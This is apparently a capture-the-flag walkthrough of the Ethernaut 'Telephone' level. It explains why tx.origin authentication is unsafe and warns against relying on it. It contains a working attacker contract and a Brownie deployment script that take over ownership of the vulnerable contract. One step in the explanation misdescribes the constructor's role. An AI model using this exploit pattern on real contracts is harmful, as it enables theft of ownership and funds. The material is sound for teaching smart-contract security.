---
title: Ethernaut - Level 04 - Telephone
date: 2022-08-24
---
{{<figure src="../images/telephone-4.svg" caption="Image courtesy of OpenZeppelin">}}
## Ethernaut 04 - Telephone
This level from Ethernaut, called Telephone, is a good exercise to learn the nuances between `tx.origin` and `msg.sender` and why you should never use `tx.origin` for authentication purposes:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```

Solidity has a global variable, `tx.origin`, which traverses the entire call stack and returns the address of the account that originally sent the transaction (or performed the call). Using this global variable for authentication in smart contracts leaves the contract vulnerable to phishing-like attacks, which is exactly what this level is about.

According to Solidity’s documentation:

> `tx.origin` holds the address of the sender of the transaction, while `msg.sender` holds the address of the sender of the message

This means that `tx.origin` will refers to the address of an account that sent a transaction, and `msg.sender` refers to the address of an account or a smart contract that is directly calling a smart contract’s function.

{{<figure src="../images/txorigin-msgsender.png" caption="`tx.origin` vs `msg.sender`">}}

Based on the previous image, if `Account` calls `contract A` , and `contract A` calls `contract B`, in `contract B`, the value assigned to `msg.sender` will be `contract B` and the value assigned to `tx.origin` will be `Account`.

## Where is the vulnerability?
The vulnerability in this contract is contained in the `changeOwner` function, as it uses `tx.origin` in the if statement before changing the contract’s owner:

```solidity {lineos=table,hl_lines=[2],lineofstart=1}
  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
```
We will pass this level if `tx.origin` differs from `msg.sender` . This can be achieved if `msg.sender` is whatever address that calls the `changeOwner` function and `tx.origin` is the address that originally started the transaction. In other words, we will use a malicious contract (`telephoneAttack.sol`) as middleman. Once we first call our `telephoneAttack.sol` contract, it will call the `Telephone.sol` instance. For the `Telephone.sol` contract, `tx.origin` will be our EOA’s (external owned account) address and `msg.sender` will be our `telephoneAttack.sol` contract’s address.

A vulnerability like this, costed THORChain $8 million dollars, as Adrian Hetman documented in his [Unboxing tx.origin: Rune Token case](https://www.adrianhetman.com/unboxing-tx-origin/) article.

## Hacking the contract
Let's start creating our malicious contract, `telephoneAttack.sol`, with the following implementation:

```solidity {lineos=table,hl_lines=[9,10,11,13,14],lineofstart=1}
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import 'interfaces/telephoneInterface.sol';

contract TelephoneAttack {
    TelephoneInterface telephone;

    constructor(address _attackerAddress) public{
        telephone = TelephoneInterface(_attackerAddress);
    }

    function exploit() public {
        telephone.changeOwner(msg.sender);
    }

    function destroy() public {
        selfdestruct(msg.sender);
    }
}
```

As always, the script to trigger the attack is shown below:

```python {lineos=table,hl_lines=[5,6,11],lineofstart=1}
from brownie import accounts, config, interface, web3, TelephoneAttack


def exploit(target, hacker):
    deploy_attack = TelephoneAttack.deploy(target, {"from": hacker})
    deploy_attack.exploit({'from': hacker, 'allow_revert': True})
    deploy_attack.destroy({'from': hacker})


def main(target):
    hacker = accounts.add(config['wallets']['from_key'])
    print(f'Attacker address: {hacker}, Target address: {target}')
    exploit(target, hacker)
```


Based on the explanation provided before the attack can be summarized in few steps:

- We start by deploying our malicious contract (`TelephoneAttack.deploy`), therefore, `tx.origin` will have the user's account address.
- The `TelephoneAattack` contract initializes an instance of `Telephone` within its `constructor` passing the `TelephoneAttack` contract's address as `msg.sender`.
- Our script will call `deploy_attack.exploit`, which executes the `exploit()` function and calls `telephone.changeOwner(msg.sender);`.
- As mentioned earlier in this walkthrough, the `tx.origin` is a global variable which traverses the entire call stack and returns the address of the account that originally sent the transaction, our user account, differing from the value assigned to `msg.sender` (Our `TelephonAttack` contract's address).
- As `tx.origin` differs from `msg.sender`, our exploit will pass the `if` statement and execute the `owner = _owner;` statement, assigning us as the contract's legitimate owner

## Takeaways
The most valuable takeaway from this challenge is to learn to not use `tx.origin` for authorization purposes, additionally, by using `tx.origin` you are limiting interoperability between contracts, since contracts using `tx.origin` cannot be used by other contracts (*a contract can never be the `tx.origin`*). Instead, you should use `msg.sender` for authorization.